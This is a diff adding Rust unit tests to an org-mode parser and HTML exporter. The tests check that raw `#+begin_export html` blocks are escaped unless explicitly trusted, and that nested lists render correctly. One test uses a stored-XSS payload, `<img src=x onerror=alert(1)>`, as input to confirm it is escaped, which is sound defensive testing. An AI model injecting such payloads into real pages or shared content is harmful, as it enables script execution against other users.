+        assert!(!is_drawer_open_line("prose with a :tag: in it"));
+        assert!(!is_drawer_open_line(""));
+        assert!(is_drawer_open_line(":PROPERTIES:"));
+        assert!(is_drawer_open_line(":LOGBOOK:"));
+        assert!(is_drawer_open_line(":my-custom-drawer:"));
+    }
+
+    #[test]
     fn unterminated_properties_drawer_consumes_to_eof_without_hanging() {
         // Adversarial: a drawer missing its `:END:` must not infinite-loop
         // or panic -- it should just consume the rest of the document.
@@ -1149,6 +1658,58 @@ mod tests {
         let html = html::HtmlExporter.export(&OrgMeta::default(), &elements);
         assert!(!html.contains("<script>"), "must be escaped: {html}");
         assert!(html.contains("&lt;script&gt;"), "got: {html}");
+    }
+
+    #[test]
+    fn adversarial_begin_export_html_is_escaped_by_default() {
+        // Real, no-click stored-XSS: standard org semantics pass
+        // `#+begin_export html ... #+end_export` straight through raw,
+        // assuming a trusted single author -- but this parser feeds KB
+        // node content that isn't necessarily self-authored (federated/
+        // shared KBs) into the SAME exporter. Default (no explicit opt-in
+        // via ExportOptions::allow_raw_html_export_blocks) must escape it.
+        let src = "#+begin_export html\n<img src=x onerror=alert(1)>\n#+end_export\n";
+        let (_, elements) = parse_org_document(src);
+        let html = html::HtmlExporter.export(&OrgMeta::default(), &elements);
+        assert!(!html.contains("<img"), "must be escaped by default: {html}");
+        assert!(
+            html.contains("&lt;img src=x onerror=alert(1)&gt;"),
+            "got: {html}"
+        );
+    }
+
+    #[test]
+    fn begin_export_html_passes_through_raw_when_explicitly_trusted() {
+        // The opt-in escape hatch: a caller that already trusts its own
+        // source content (e.g. org_export on the human's own local
+        // buffer, gated behind the org_export_allow_raw_html_blocks
+        // editor option) can still get standard org semantics.
+        let src = "#+begin_export html\n<div class=\"custom-badge\">Hi</div>\n#+end_export\n";
+        let (_, elements) = parse_org_document(src);
+        let mut meta = OrgMeta::default();
+        meta.options.allow_raw_html_export_blocks = true;
+        let html = html::HtmlExporter.export(&meta, &elements);
+        assert!(
+            html.contains("<div class=\"custom-badge\">Hi</div>"),
+            "explicit opt-in must pass raw HTML through unescaped: {html}"
+        );
+    }
+
+    #[test]
+    fn nested_list_renders_as_real_nested_html_markup() {
+        // Parsing alone (ListItem::children populated) isn't the whole
+        // fix -- the renderer has to actually emit it as a nested
+        // <ul>/<ol>, or a nested sub-list would parse correctly and then
+        // silently vanish from the rendered output.
+        let src = "- Top item\n  - Nested A\n  - Nested B\n- Second top item\n";
+        let (_, elements) = parse_org_document(src);
+        let html = html::HtmlExporter.export(&OrgMeta::default(), &elements);
+        assert!(
+            html.contains("<li>Top item<ul>\n<li>Nested A</li>"),
+            "{html}"
+        );
+        assert!(html.contains("<li>Nested B</li>\n</ul>\n</li>"), "{html}");
+        assert!(html.contains("<li>Second top item</li>"), "{html}");
     }
 
     #[test]
